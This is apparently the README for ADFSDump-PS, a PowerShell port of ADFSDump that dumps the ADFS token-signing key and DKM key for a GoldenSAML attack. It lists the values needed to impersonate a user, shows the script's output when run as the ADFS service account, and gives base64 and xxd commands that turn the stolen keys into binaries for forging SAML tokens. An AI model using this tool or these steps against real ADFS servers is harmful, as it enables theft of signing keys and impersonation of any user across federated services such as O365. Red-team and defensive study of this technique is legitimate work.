# ADFSDump-PS
I can't take credit for the hard work done in building [ADFSDump](https://github.com/mandiant/ADFSDump) but this is a PowerShell port of it using native functions. 

## Pre-Reqs
You'll need a few prereqs to install on the box you're running this on, so it's not 100% self-contained, these are as follows:
- Install-Module -Name  ActiveDirectory
- Install-Module -Name SqlServer

You'll also need the following values for the GoldenSAML attack:
```
User Email/UPN - User to be impersonated
User ObjectGUID - Respective GUID for said user to be impersonated
DKM Key - Gathered using this script
TKS Key - Gathered using this script
Domain - Domain as seen by STS/ADFS/O365
```

## Usage 
To execute this you'll need to be running in the context of the ADFS Service account and on the server where ADFS Lives. 

```
.\Golden.ps1
Encrypted Token Signing Key: <Base64blob>
Certificate value: <certificate value>
Store location value: <StoreLocation>
Store name value: <StoreName>
DKM Key: <DKMKeyValue>
Domain is: example.zsec.uk
```

![image](https://github.com/ZephrFish/ADFSDump-PS/assets/5783068/9594365d-918d-4be5-b44e-ea9ac1e04a35)


If you want to do GoldenSAML, you'll need to do our conversion in the final few steps. Once you've got both the encrypted blob and the DKM key from the script, you'll need to run the following to convert them:
- `cat TKSKey.txt | base64 -d > TKSKey.bin`
- `cat DKM.txt | tr -d "-" | xxd -r -p > DKM.bin`


I'll link these two together later but save the DKM to DKM.txt and the encrytped b64 blob to TKSKey.txt, the PS will do the rest :).
